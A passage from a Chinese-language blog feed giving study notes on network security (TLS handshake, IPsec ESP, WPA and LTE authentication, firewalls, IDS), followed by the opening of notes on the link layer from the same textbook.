<h2 id="securing-e-mail" class="heading"><a href="#securing-e-mail" class="heading-anchor" aria-label="章节： Securing E-Mail" tabindex="-1"></a><span>Securing E-Mail</span></h2>
<h3 id="secure-e-mail" class="heading"><a href="#secure-e-mail" class="heading-anchor" aria-label="章节： Secure E-Mail" tabindex="-1"></a><span>Secure E-Mail</span></h3>
<p>就是上面这些东西的一个实例<span class="mojikumi-line-end">，</span>没啥新东西<span class="mojikumi-line-end">：</span>结合 digital signature 和使用 session key 的 encryption 即可<span class="mojikumi-line-end">；</span>需要双方互相知道对方的 public key<span class="mojikumi-line-start">（</span>分别用于 digital signature 的验证和 session key 的传输<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>public key 可以由 CA 认证<span class="mojikumi-line-end">。</span></p>
<a id="spf、dkim、dmarc" name="spf、dkim、dmarc" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-purple-2 dark:bg-purple-9 b-purple-5" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h4 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-help-circle-outline text-purple" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Question: </span><span data-v-a2ab257f>SPF、DKIM、DMARC</span></h4><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>为啥不讲 SPF<span class="mojikumi-line-end">、</span>DKIM<span class="mojikumi-line-end">、</span>DMARC 🤔</p></div></div></aside>
<h3 id="pgp" class="heading"><a href="#pgp" class="heading-anchor" aria-label="章节： PGP" tabindex="-1"></a><span>PGP</span></h3>
<p>PGP 提供了 sign<span class="mojikumi-line-end">、</span>encrypt<span class="mojikumi-line-end">、</span>sign and encrypt 等功能<span class="mojikumi-line-end">，</span>public key 通过用户之间的 web of trust 而非 CA 来 certify<span class="mojikumi-line-end">，</span>可以线下举办 key-signing party 来互相 sign<sup><a href="#user-content-fn-sign" id="user-content-fnref-sign" data-footnote-ref aria-describedby="footnote-label">1</a></sup><span class="mojikumi-line-end">。</span></p>
<h2 id="securing-tcp-connections-tls" class="heading"><a href="#securing-tcp-connections-tls" class="heading-anchor" aria-label="章节： Securing TCP Connections: TLS" tabindex="-1"></a><span>Securing TCP Connections: TLS</span></h2>
<p>TLS (Transport Layer Security) 为 TCP 提供了 security services<span class="mojikumi-line-end">，</span>是 SSL (Secure Sockets Layer) 标准化后的升级版<span class="mojikumi-line-start">（</span>只不过现在人们有时仍会把 TLS 误称为 SSL<span class="mojikumi-line-end">，</span>OpenSSL 的名字也有一定的误导性<sup><a href="#user-content-fn-opentls" id="user-content-fnref-opentls" data-footnote-ref aria-describedby="footnote-label">2</a></sup><span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<p>TLS 通常用于 HTTP<span class="mojikumi-line-end">，</span>表现为网址开头是 <code>https://</code><span class="mojikumi-line-end">，</span>但它实际上可以用于任何基于 TCP 的 application<span class="mojikumi-line-end">。</span>TLS 位于 application layer<span class="mojikumi-line-end">，</span>但它提供了类似 TCP 的 API<span class="mojikumi-line-end">，</span>对于 application developer 来说就像是 transport layer 的一部分<span class="mojikumi-line-end">。</span></p>
<h3 id="tls-handshake" class="heading"><a href="#tls-handshake" class="heading-anchor" aria-label="章节： TLS Handshake" tabindex="-1"></a><span>TLS Handshake</span></h3>
<ol>
<li>TCP 3-way handshake</li>
<li>client 发送 TLS version<span class="mojikumi-line-end">、</span>supported cipher suites (symmetric algorithm<span class="mojikumi-line-end">、</span>public key algorithm<span class="mojikumi-line-end">、</span>HMAC algorithm)<span class="mojikumi-line-end">、</span>client nonce<span class="mojikumi-line-end">。</span></li>
<li>server 发送 selected cipher suite<span class="mojikumi-line-end">、</span>certificate<span class="mojikumi-line-end">、</span>server nonce<span class="mojikumi-line-end">。</span></li>
<li>client 验证 certificate<span class="mojikumi-line-end">，</span>得到 server 的 public key<span class="mojikumi-line-end">；</span>随机生成 pre-master secret (PMS)<span class="mojikumi-line-end">，</span>发送经 server 的 public key 加密的 PMS<span class="mojikumi-line-end">。</span></li>
<li>由 PMS<span class="mojikumi-line-end">、</span>client nonce<span class="mojikumi-line-end">、</span>server nonce 可以计算得到 master key<span class="mojikumi-line-end">，</span>由 master key 可以得到一系列用于后续加密的 key<span class="mojikumi-line-end">：</span>client 和 server 各有用于 symmetric key encryption 的 key 和用于 HMAC 的 key<span class="mojikumi-line-end">，</span>如果使用 CBC 则还有双方的 IV<span class="mojikumi-line-end">。</span></li>
<li>client 发送上面这些 handshake message 的 HMAC<span class="mojikumi-line-start">（</span>可以和 encrypted PMS 一同发送<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></li>
<li>server 发送上面这些 handshake message 的 HMAC<span class="mojikumi-line-end">。</span></li>
</ol>
<p>其中<span class="mojikumi-line-end">，</span>一开始的 nonce 用来防止 replay attack<span class="mojikumi-line-end">，</span>并且 server nonce 参与 master key 的计算<span class="mojikumi-line-end">，</span>可以防止 key 完全由 client 决定<span class="mojikumi-line-end">。</span>而最后的 HMAC 用来防止篡改 handshake message<span class="mojikumi-line-end">，</span>例如将 supported cipher suites 改为只有 weak algorithm<span class="mojikumi-line-end">。</span></p>
<p>TLS 1.3 对 handshake 过程进行了简化<span class="mojikumi-line-end">。</span></p>
<h3 id="tls-data-transfer" class="heading"><a href="#tls-data-transfer" class="heading-anchor" aria-label="章节： TLS Data Transfer" tabindex="-1"></a><span>TLS Data Transfer</span></h3>
<p>在 TLS 中<span class="mojikumi-line-end">，</span>TCP byte stream 被切分为 records<span class="mojikumi-line-end">，</span>为每个 record 计算 HMAC<span class="mojikumi-line-end">，</span>并将 record + HMAC 进行 encrypt<span class="mojikumi-line-end">。</span>这只保证了每个 record 的 integrity<span class="mojikumi-line-end">，</span>为了保证整个 byte stream 的 integrity<span class="mojikumi-line-end">，</span>每个 record 还有一个 sequence number<span class="mojikumi-line-end">，</span>参与 HMAC 的计算<span class="mojikumi-line-end">，</span>来防止攻击者对 record 进行 reorder / replay / remove<span class="mojikumi-line-end">。</span></p>
<p>TLS record 包含<span class="mojikumi-line-end">：</span></p>
<ol>
<li>type: handshake / data</li>
<li>TLS version</li>
<li>length: 用来标记 record 的结尾</li>
<li>data + HMAC, encrypted</li>
</ol>
<h3 id="tls-connection-closure" class="heading"><a href="#tls-connection-closure" class="heading-anchor" aria-label="章节： TLS Connection Closure" tabindex="-1"></a><span>TLS Connection Closure</span></h3>
<p>为了防止 truncation attack<span class="mojikumi-line-end">，</span>即伪造 TCP FIN segment<span class="mojikumi-line-end">，</span>在 TLS 中需要先发送保证了 integrity 的 closure TLS record 再发送 TCP FIN segment 来结束连接<span class="mojikumi-line-end">。</span></p>
<h2 id="network-layer-security-ipsec-and-virtual-private-networks" class="heading"><a href="#network-layer-security-ipsec-and-virtual-private-networks" class="heading-anchor" aria-label="章节： Network-Layer Security: IPsec and Virtual Private Networks" tabindex="-1"></a><span>Network-Layer Security: IPsec and Virtual Private Networks</span></h2>
<h3 id="ipsec-and-virtual-private-networks-vpns" class="heading"><a href="#ipsec-and-virtual-private-networks-vpns" class="heading-anchor" aria-label="章节： IPsec and Virtual Private Networks (VPNs)" tabindex="-1"></a><span>IPsec and Virtual Private Networks (VPNs)</span></h3>
<p>如果一个 institution 位于多个地理位置而想保证 institution 内通信的私密<span class="mojikumi-line-end">，</span>一种选择是建立一个 private network<span class="mojikumi-line-end">，</span>在物理上与 Internet 进行隔离<span class="mojikumi-line-end">，</span>但这样需要自己搭建整套网络基础设施<span class="mojikumi-line-end">，</span>开销非常大<span class="mojikumi-line-end">。</span></p>
<p>另一种选择是使用 virtual private network<span class="mojikumi-line-end">。</span>在 VPN 内<span class="mojikumi-line-end">，</span>通过 Internet 传输数据时会进行加密<span class="mojikumi-line-end">，</span>具体来说是在内网的 gateway router 或直接连到公网的 host 处<span class="mojikumi-line-start">（</span>例如学校连到 Internet 的 gateway router / 回家了的学生的设备上<span class="mojikumi-line-end">；</span>为了叙述方便<span class="mojikumi-line-end">，</span>下文中都假设是 gateway router 而不是 host<span class="mojikumi-line-end">）</span>在 payload 前加上 IPsec header<span class="mojikumi-line-end">。</span></p>
<h3 id="the-ah-and-esp-protocols" class="heading"><a href="#the-ah-and-esp-protocols" class="heading-anchor" aria-label="章节： The AH and ESP Protocols" tabindex="-1"></a><span>The AH and ESP Protocols</span></h3>
<p>IPsec 可以使用 Authentication Header (AH) protocol 或者 Encapsulation Security Payload (ESP) protocol<span class="mojikumi-line-end">。</span>其中 AH 只提供了 source authentication 和 data integrity<span class="mojikumi-line-end">，</span>ESP 在此基础上还提供了 confidentiality<span class="mojikumi-line-end">。</span>使用 IPsec 的场景中通常需要保证 confidentiality<span class="mojikumi-line-end">，</span>所以 ESP 用得更多<span class="mojikumi-line-end">，</span>书中只讲 ESP<span class="mojikumi-line-end">。</span></p>
<h3 id="security-associations" class="heading"><a href="#security-associations" class="heading-anchor" aria-label="章节： Security Associations" tabindex="-1"></a><span>Security Associations</span></h3>
<p>两个 entity (gateway router) 通过 IPsec 通信时需要建立称作 <i>security association</i> (SA) 的 logical connection<span class="mojikumi-line-end">。</span>SA 是单向的<span class="mojikumi-line-end">，</span>如果要互发消息则需要建立两个 SA<span class="mojikumi-line-end">。</span></p>
<p>SA 有下列 state information<span class="mojikumi-line-end">：</span></p>
<ul>
<li><i>security parameter index</i> (SPI)<span class="mojikumi-line-end">，</span>一个 32-bit identifier</li>
<li>source &#x26; destination IP address</li>
<li>encryption algorithm, encryption key</li>
<li>integrity check algorithm, authentication key</li>
</ul>
<p>一个 IPsec entity 可能同时 maintain 着很多 SA 的 state information<span class="mojikumi-line-end">，</span>存储在 security association database (SAD) 中<span class="mojikumi-line-end">。</span></p>
<h3 id="the-ipsec-datagram" class="heading"><a href="#the-ipsec-datagram" class="heading-anchor" aria-label="章节： The IPsec Datagram" tabindex="-1"></a><span>The IPsec Datagram</span></h3>
<p>IPsec 有两种 packet form<span class="mojikumi-line-end">，</span>分别用于 tunnel mode 和 transport mode<span class="mojikumi-line-end">，</span>其中 tunnel mode 更常用<span class="mojikumi-line-end">，</span>书中只讲 tunnel mode<span class="mojikumi-line-end">。</span></p>
<p>一个 IPsec datagram 的结构如下<span class="mojikumi-line-end">：</span></p>
<ul>
<li>new IP header (source / destination 是 gateway router<span class="mojikumi-line-end">，</span>protocol 是 ESP)</li>
<li><span class="mojikumi-line-start">“</span>enchilada<span class="mojikumi">”</span> (authenticated)
<ul>
<li>ESP header
<ul>
<li>SPI</li>
<li>sequence number</li>
</ul>
</li>
<li>(encrypted)
<ul>
<li>original IP header</li>
<li>original IP payload</li>
<li>ESP trailer
<ul>
<li>padding (for encryption block size requirement)</li>
<li>padding length</li>
<li>next header <span class="mojikumi">（</span><span class="mojikumi">“</span>4<span class="mojikumi">”</span> for <span class="mojikumi">“</span>IP Encapsulation within IP<span class="mojikumi">”</span> in tunnel mode<span class="mojikumi-line-end">）</span><sup><a href="#user-content-fn-esp-next-header" id="user-content-fnref-esp-next-header" data-footnote-ref aria-describedby="footnote-label">3</a></sup></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>ESP MAC <span class="mojikumi">（</span>for authentication of the <span class="mojikumi">“</span>enchilada<span class="mojikumi">”</span><span class="mojikumi-line-end">）</span></li>
</ul>
<p>gateway router 会维护一个 security policy database (SPD)<span class="mojikumi-line-end">，</span>当其接收到一个待转发的 IP datagram 时<span class="mojikumi-line-end">，</span>会查询 SPD<span class="mojikumi-line-end">，</span>根据 source IP address<span class="mojikumi-line-end">、</span>destination IP address<span class="mojikumi-line-end">、</span>protocol 来决定是否使用 IPsec 进行处理<span class="mojikumi-line-end">。</span></p>
<h3 id="ike-key-management-in-ipsec" class="heading"><a href="#ike-key-management-in-ipsec" class="heading-anchor" aria-label="章节： IKE: Key Management in IPsec" tabindex="-1"></a><span>IKE: Key Management in IPsec</span></h3>
<p>IPsec 可以手动配置 key<span class="mojikumi-line-end">，</span>但大型的 VPN 往往需要使用 Internet Key Exchange (IKE) protocol 来自动建立 SA<span class="mojikumi-line-end">。</span></p>
<p><span class="mojikumi-line-start">（</span>书中对 IKE 的描述太简陋了<span class="mojikumi-line-end">，</span>说了跟没说差不多<span class="mojikumi-line-end">，</span>以后再说吧<span class="mojikumi-line-start">（</span></p>
<h2 id="securing-wireless-lans-and-4g5g-cellular-networks" class="heading"><a href="#securing-wireless-lans-and-4g5g-cellular-networks" class="heading-anchor" aria-label="章节： Securing Wireless LANs and 4G/5G Cellular Networks" tabindex="-1"></a><span>Securing Wireless LANs and 4G/5G Cellular Networks</span></h2>
<p>security 在 wireless network 中更加重要<span class="mojikumi-line-end">，</span>因为 attacker 只需要将设备置于 sender 的 transmission range 内就可以窃听<span class="mojikumi-line-end">。</span></p>
<p>wireless network security 主要需要两个功能<span class="mojikumi-line-end">：</span></p>
<ul>
<li>mutual authentication: mobile device 和 access point / base station 需要互相认证对方<span class="mojikumi-line-end">。</span></li>
<li>encryption: 通信内容需要加密<span class="mojikumi-line-end">。</span>一般使用 symmetric key cryptography (AES)<span class="mojikumi-line-end">，</span>需要进行 shared symmetric key derivation<span class="mojikumi-line-end">。</span></li>
</ul>
<h3 id="authentication-and-key-agreement-in-802-11-wireless-lans" class="heading"><a href="#authentication-and-key-agreement-in-802-11-wireless-lans" class="heading-anchor" aria-label="章节： Authentication and Key Agreement in 802.11 Wireless LANs" tabindex="-1"></a><span>Authentication and Key Agreement in 802.11 Wireless LANs</span></h3>
<p>802.11 的认证由 authentication server (AS) 进行<span class="mojikumi-line-end">，</span>AS 可以和 AP 一体<span class="mojikumi-line-end">，</span>也可以通过网络连接<span class="mojikumi-line-end">。</span></p>
<p>802.11 的 security specification 有 WEP<span class="mojikumi-line-end">、</span>WPA1<span class="mojikumi-line-end">、</span>WPA2<span class="mojikumi-line-end">、</span>WPA3<span class="mojikumi-line-end">，</span>其中 WEP 有严重的漏洞<span class="mojikumi-line-end">。</span></p>
<p>总体上的步骤为<span class="mojikumi-line-end">：</span></p>
<ol>
<li>在 AP 广播自己的存在时<span class="mojikumi-line-end">，</span>会附带其支持的 security mechanism<span class="mojikumi-line-end">，</span>mobile device 连接到 AP 时可以选择要使用哪个<span class="mojikumi-line-end">。</span></li>
<li>mobile device 和 AS 预先有一个 pre-shared key<span class="mojikumi-line-start">（</span>PSK<span class="mojikumi-line-end">，</span>也就是 Wi-Fi 密码<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>会根据这个 PSK 进行 mutual authentication 和 shared symmetric key derivation<span class="mojikumi-line-end">。</span></li>
<li>AS 把 shared symmetric key 告诉 AP<span class="mojikumi-line-end">。</span></li>
<li>使用 shared symmetric key 进行加密通信<span class="mojikumi-line-end">。</span></li>
</ol>
<p>WPA 的核心是一套 four-way handshake<span class="mojikumi-line-end">，</span>其中前两步完成 mutual authentication 和 shared symmetric key derivation<span class="mojikumi-line-start">（</span>后两步用于 group key derivation<span class="mojikumi-line-end">，</span>书中不涉及<span class="mojikumi">）</span><span class="mojikumi-line-end">：</span></p>
<ol>
<li>AS 生成一个 AS nonce<span class="mojikumi-line-end">，</span>发给 mobile device<span class="mojikumi-line-end">。</span></li>
<li>mobile device 生成一个 mobile nonce<span class="mojikumi-line-end">，</span>根据双方的 nonce<span class="mojikumi-line-end">、</span>双方的 MAC address 以及 PSK 得到 shared symmetric key<span class="mojikumi-line-end">，</span>然后向 AS 发送 mobile nonce<span class="mojikumi-line-end">，</span>以及编码了 AS nonce 和 PSK 的 HMAC<span class="mojikumi-line-end">。</span></li>
</ol>
<p>mobile device 和 AS 的通信通过 EAP (extensible authentication protocol) 进行<span class="mojikumi-line-end">，</span>它在 mobile device 到 AP 使用 EAP over LAN<span class="mojikumi-line-end">，</span>在 AP 到 AS 使用 RADIUS 或更新的 DIAMETER 协议<span class="mojikumi-line-end">。</span></p>
<h3 id="authentication-and-key-agreement-in-4g5g-cellular-networks" class="heading"><a href="#authentication-and-key-agreement-in-4g5g-cellular-networks" class="heading-anchor" aria-label="章节： Authentication and Key Agreement in 4G/5G Cellular Networks" tabindex="-1"></a><span>Authentication and Key Agreement in 4G/5G Cellular Networks</span></h3>
<p>cellular network 使用存储在 SIM card 和 HSS 中的 PSK 进行认证<span class="mojikumi-line-end">。</span>在 4G LTE 中<span class="mojikumi-line-end">，</span>步骤如下<span class="mojikumi-line-end">：</span></p>
<ol>
<li>
<ol>
<li>mobile device 向 base station 发送 attach message<span class="mojikumi-line-end">。</span></li>
<li>MME 向 HSS 发送 IMSI 以及 visited network information<span class="mojikumi-line-end">。</span></li>
</ol>
</li>
<li>
<ol>
<li>HSS 计算出能证明自己身份的 auth token<span class="mojikumi-line-end">，</span>以及用于证明 mobile device 身份的 expected auth response<span class="mojikumi-line-end">，</span>将它们发送给 MME<span class="mojikumi-line-end">。</span></li>
<li>MME 将 auth token 发给 mobile device<span class="mojikumi-line-end">。</span></li>
</ol>
</li>
<li>
<ol>
<li>mobile device 根据 auth token 认证 HSS<span class="mojikumi-line-end">。</span></li>
<li>mobile device 计算出 auth response<span class="mojikumi-line-end">，</span>发送给 MME<span class="mojikumi-line-end">。</span></li>
</ol>
</li>
<li>
<ol>
<li>MME 比较 HSS 发送的 expected auth response 和 mobile device 发送的 auth response 来认证 mobile device<span class="mojikumi-line-end">。</span></li>
<li>MME 将下一步需要用到的 key 发给 base station<span class="mojikumi-line-end">。</span></li>
</ol>
</li>
<li>base station 和 mobile device 进行 shared symmetric key derivation<span class="mojikumi-line-end">，</span>会在 control plane 和 data plane 使用不同的 key<span class="mojikumi-line-end">。</span></li>
</ol>
<p>5G 的认证有一些不同<span class="mojikumi-line-end">：</span></p>
<ul>
<li>authentication decision 从 MME 挪到了 HSS<span class="mojikumi-line-end">，</span>使得 visited network 的 middleman 作用更小<span class="mojikumi-line-end">。</span></li>
<li>新增了两种 authentication protocol<span class="mojikumi-line-end">，</span>一种和 4G 类似但使用了 EAP<span class="mojikumi-line-end">，</span>一种不需要 PSK 而适用于 IoT<span class="mojikumi-line-end">。</span></li>
<li>使用了 public key cryptography 来加密 IMSI<span class="mojikumi-line-end">。</span></li>
</ul>
<h2 id="operational-security-firewalls-and-intrusion-detection-systems" class="heading"><a href="#operational-security-firewalls-and-intrusion-detection-systems" class="heading-anchor" aria-label="章节： Operational Security: Firewalls and Intrusion Detection Systems" tabindex="-1"></a><span>Operational Security: Firewalls and Intrusion Detection Systems</span></h2>
<h3 id="firewalls" class="heading"><a href="#firewalls" class="heading-anchor" aria-label="章节： Firewalls" tabindex="-1"></a><span>Firewalls</span></h3>
<p>firewall 用来控置哪些流量可以进入 internal network / host<span class="mojikumi-line-end">，</span>一般要保证所有出入的流量都经过 firewall<span class="mojikumi-line-end">，</span>并且 firewall 自身不会被攻击者控制<span class="mojikumi-line-end">。</span></p>
<h4 id="traditional-packet-filters" class="heading"><a href="#traditional-packet-filters" class="heading-anchor" aria-label="章节： Traditional Packet Filters" tabindex="-1"></a><span>Traditional Packet Filters</span></h4>
<p>通过 packet header 来控制是否允许 packet 通过<span class="mojikumi-line-end">。</span>例如根据 IP address<span class="mojikumi-line-end">、</span>protocol type<span class="mojikumi-line-end">、</span>port<span class="mojikumi-line-end">、</span>TCP flags<span class="mojikumi-line-end">、</span>ICMP message type<span class="mojikumi-line-end">、</span>router interface 等进行控制<span class="mojikumi-line-end">。</span></p>
<p>一些 packet filter 可以实现的 policy 的例子<span class="mojikumi-line-end">：</span></p>
<ul>
<li>drop outgoing 的对 port 80/443 的访问<span class="mojikumi-line-end">：</span>禁止访问外部 Web<span class="mojikumi-line-end">。</span></li>
<li>drop incoming TCP SYN segment<span class="mojikumi-line-end">：</span>禁止从外界创建 TCP connection<span class="mojikumi-line-end">。</span></li>
<li>drop 除了外界 port 是 53 的所有 UDP traffic<span class="mojikumi-line-end">：</span>禁止其他 UDP traffic<span class="mojikumi-line-end">，</span>只允许 DNS<span class="mojikumi-line-end">。</span></li>
<li>drop 发向 broadcast address 的 ICMP ping packets<span class="mojikumi-line-end">：</span>避免遭受 smurf DoS attack<span class="mojikumi-line-end">。</span></li>
<li>drop outgoing ICMP TTL expired packets<span class="mojikumi-line-end">：</span>避免被 traceroute<span class="mojikumi-line-end">。</span></li>
</ul>
<h4 id="stateful-packet-filters" class="heading"><a href="#stateful-packet-filters" class="heading-anchor" aria-label="章节： Stateful Packet Filters" tabindex="-1"></a><span>Stateful Packet Filters</span></h4>
<p>stateful packet filter 可以通过记录状态信息来实现更复杂的控制<span class="mojikumi-line-end">，</span>例如跟踪 TCP connection<span class="mojikumi-line-end">，</span>从而更加精准地只允许从内部建立的 TCP connection 而拒绝从外部建立的 TCP connection<span class="mojikumi-line-end">。</span></p>
<h4 id="application-gateway" class="heading"><a href="#application-gateway" class="heading-anchor" aria-label="章节： Application Gateway" tabindex="-1"></a><span>Application Gateway</span></h4>
<p>packet filter 只根据 header 中的信息进行控制<span class="mojikumi-line-end">，</span>而不管 application data<span class="mojikumi-line-end">。</span></p>
<p>application gateway 是一个 application-specific server<span class="mojikumi-line-end">，</span>所有 application data 都需要通过它<span class="mojikumi-line-end">。</span>一个 host 可以同时运行多个 application gateway<span class="mojikumi-line-end">。</span></p>
<p>application gateway 可以根据 application data 进行控制<span class="mojikumi-line-end">，</span>提供例如 authorization 的高级 filter 功能<span class="mojikumi-line-end">，</span>还可以提供除了 filter 外的其他功能<span class="mojikumi-line-end">，</span>例如 proxy<span class="mojikumi-line-end">。</span></p>
<h3 id="intrusion-detection-systems" class="heading"><a href="#intrusion-detection-systems" class="heading-anchor" aria-label="章节： Intrusion Detection Systems" tabindex="-1"></a><span>Intrusion Detection Systems</span></h3>
<p>和 application gateway 类似<span class="mojikumi-line-end">，</span>intrusion detection system (IDS) 不止查看 header<span class="mojikumi-line-end">，</span>还会查看 application data<span class="mojikumi-line-end">，</span>这称作 deep packet inspection<span class="mojikumi-line-end">。</span></p>
<p>与 application gateway 不同<span class="mojikumi-line-end">，</span>IDS 不是 application-specific 的<span class="mojikumi-line-end">，</span>而是会检测到各种各样的 suspicious packet / series of packets<span class="mojikumi-line-end">，</span>例如 network mapping<span class="mojikumi-line-end">、</span>port scan<span class="mojikumi-line-end">、</span>TCP stack scan<span class="mojikumi-line-end">、</span>DoS attack<span class="mojikumi-line-end">、</span>worm / virus<span class="mojikumi-line-end">、</span>OS / application vulnerability attack<span class="mojikumi-line-end">。</span>检测到时<span class="mojikumi-line-end">，</span>IDS 会向管理员发送警告<span class="mojikumi-line-end">，</span>而 intrustion prevention system (IPS) 则会 filter out 这些 packet<span class="mojikumi-line-end">。</span></p>
<p>因为 deep packet inspection 需要一定的算力<span class="mojikumi-line-end">，</span>当流量过大时<span class="mojikumi-line-end">，</span>一个 organization 往往需要多个 IDS<span class="mojikumi-line-end">，</span>分散在网络中<span class="mojikumi-line-end">，</span>而非只设置一个在整个网络的入口<span class="mojikumi-line-end">。</span></p>
<p>IDS 分为 signature-based 和 anomaly-based 两种<span class="mojikumi-line-end">。</span></p>
<p>signature 即 packet 的特征<span class="mojikumi-line-end">，</span>例如 header 的某些项以及 application data 包含某一内容<span class="mojikumi-line-end">。</span>IDS 维护了一个 signature database 用来进行匹配<span class="mojikumi-line-end">。</span>signature-based IDS 需要事先知道 attack 的特征<span class="mojikumi-line-end">，</span>所以无法防范新型 attack<span class="mojikumi-line-end">。</span>signature 的匹配容易出现 false alarm<span class="mojikumi-line-end">，</span>而且性能开销较大<span class="mojikumi-line-end">。</span></p>
<p>anomaly-based IDS 基于平时的 traffic 来检测 statistically unusual 的 traffic<span class="mojikumi-line-end">，</span>例如检测到突然增多的 ICMP packets<span class="mojikumi-line-end">。</span>anomaly-based IDS 不依赖于实现对攻击的了解<span class="mojikumi-line-end">，</span>所以有可能检测到新型的攻击<span class="mojikumi-line-end">。</span>但是区分 normal traffic 和 statistically unusual traffic 是困难的<span class="mojikumi-line-end">，</span>现在的 IDS 通常还是以 signature-based 为主<span class="mojikumi-line-end">。</span></p>
<p>Snort 是一款 open-source IDS<span class="mojikumi-line-end">，</span>有一个活跃的 community 维护着 signature database<span class="mojikumi-line-end">。</span></p>
<section data-footnotes class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
<ol>
<li id="user-content-fn-sign">
<p>P.S. 我有幸在 <a href="https://tuna.moe/event/2021/welcome-and-debian/">第一次参加 tunight</a> 时获得了续老师的 signing<span class="mojikumi-line-end">，</span>当时还完全不懂这些<span class="mojikumi-line-start">（</span><s>现在也不是很懂<span class="mojikumi-line-start">（</span></s> <a href="#user-content-fnref-sign" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-opentls">
<p>See <a href="https://github.com/openssl/openssl/issues/6384">Rename OpenSSL to OpenTLS To Comply with RFC7568 · Issue #6384 · openssl/openssl</a> &#x26; <a href="https://www.openssl.org/blog/blog/2018/12/20/20years/">Celebrating 20 Years of OpenSSL - OpenSSL Blog</a> <a href="#user-content-fnref-opentls" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-esp-next-header">
<p>可以参考 <a href="http://www.tcpipguide.com/free/t_IPSecEncapsulatingSecurityPayloadESP-2.htm" class="break-all">http://www.tcpipguide.com/free/t_IPSecEncapsulatingSecurityPayloadESP-2.htm</a> <a href="#user-content-fnref-esp-next-header" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/cnatda">cnatda</category>
            <category domain="https://ouuan.moe/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</category>
        </item>
        <item>
            <title><![CDATA[CNATDA 第六章学习笔记]]></title>
            <link>https://ouuan.moe/post/2023/07/cnatda-6</link>
            <guid>https://ouuan.moe/post/2023/07/cnatda-6</guid>
            <pubDate>Sat, 15 Jul 2023 09:18:30 GMT</pubDate>
            <description><![CDATA[
<p><span class="mojikumi-line-start">《</span>Computer Networking: A Top-Down Approach (8th Edition)<span class="mojikumi-line-end">》</span>第六章 <span class="mojikumi">“</span>The Link Layer and LANs<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>
]]></description>
            <content:encoded><![CDATA[
<p><span class="mojikumi-line-start">《</span>Computer Networking: A Top-Down Approach (8th Edition)<span class="mojikumi-line-end">》</span>第六章 <span class="mojikumi">“</span>The Link Layer and LANs<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>

<h2 id="introduction-to-the-link-layer" class="heading"><a href="#introduction-to-the-link-layer" class="heading-anchor" aria-label="章节： Introduction to the Link Layer" tabindex="-1"></a><span>Introduction to the Link Layer</span></h2>
<p>link layer 的主要功能是将 datagram 从一个 node 传输到另一个 node<span class="mojikumi-line-end">，</span>还可以提供下列 service<span class="mojikumi-line-end">：</span></p>
<ul>
<li>framing: 将 network-layer datagram 封装在 link-layer frame 中进行传输<span class="mojikumi-line-end">。</span></li>
<li>link access: 通过 medium access control (MAC) protocol 控制 frame 在 link 上如何传输<span class="mojikumi-line-end">。</span>这对于 point-to-point link 来说是简单的<span class="mojikumi-line-end">，</span>但在 broadcast link 中会遇到 multiple access problem<span class="mojikumi-line-end">，</span>需要 MAC protocol 来进行协调<span class="mojikumi-line-end">。</span></li>
<li>reliable delivery: 通过与 TCP 类似的方式<span class="mojikumi-line-start">（</span>acknowledgement<span class="mojikumi-line-end">、</span>retransmission<span class="mojikumi-line-end">）</span>来保证单个 link 上的 reliable delivery<span class="mojikumi-line-end">。</span>这在出错率较高时可以避免单个 link 的传输错误导致 end-to-end retransmission<span class="mojikumi-line-end">，</span>而在出错率较低时会造成不必要的 overhead<span class="mojikumi-line-end">，</span>所以一般是出错率较高的 wireless link 才会提供 reliable delivery<span class="mojikumi-line-end">。</span></li>
<li>error detection and correction</li>
</ul>
<p>在 host 中<span class="mojikumi-line-end">，</span>link layer 一般实现于外接的 network adapter (network interface controller, NIC) 中<span class="mojikumi-line-end">，</span>由硬件实现<span class="mojikumi-line-end">。</span>host 中还会有软件用来连接 link layer 和 network layer<span class="mojikumi-line-end">。</span></p>
<h2 id="error-detection-and-correction-techniques" class="heading"><a href="#error-detection-and-correction-techniques" class="heading-anchor" aria-label="章节： Error-Detection and -Correction Techniques" tabindex="-1"></a><span>Error-Detection and -Correction Techniques</span></h2>
<p>参见 <a href="/post/2023/01/ddpp-2#codes-for-detecting-and-correcting-errors">DDPP 第二章的相关内容</a><span class="mojikumi-line-end">。</span></p>
<h2 id="multiple-access-links-and-protocols" class="heading"><a href="#multiple-access-links-and-protocols" class="heading-anchor" aria-label="章节： Multiple Access Links and Protocols" tabindex="-1"></a><span>Multiple Access Links and Protocols</span></h2>
<p>在 broadcast link 中<span class="mojikumi-line-end">，</span>同时只能有一方发送信息<span class="mojikumi-line-end">。</span>如果多方同时发送<span class="mojikumi-line-end">，</span>则会产生 collision<span class="mojikumi-line-end">，</span>每一方发送的信息都会丢失<span class="mojikumi-line-end">。</span>为了解决 multiple access problem<span class="mojikumi-line-end">，</span>需要使用 multiple access protocol 来进行协调<span class="mojikumi-line-end">。</span></p>
<p>一个理想的 multiple access protocol 能做到<span class="mojikumi-line-end">：</span></p>
<ul>
<li>只有一方发送时<span class="mojikumi-line-end">，</span>完全利用带宽</li>
<li>多方同时发送时<span class="mojikumi-line-end">，</span>均分全部的带宽</li>
<li>decentralized<span class="mojikumi-line-end">，</span>没有 single point of failure</li>
<li>simple, inexpensive to implement</li>
</ul>
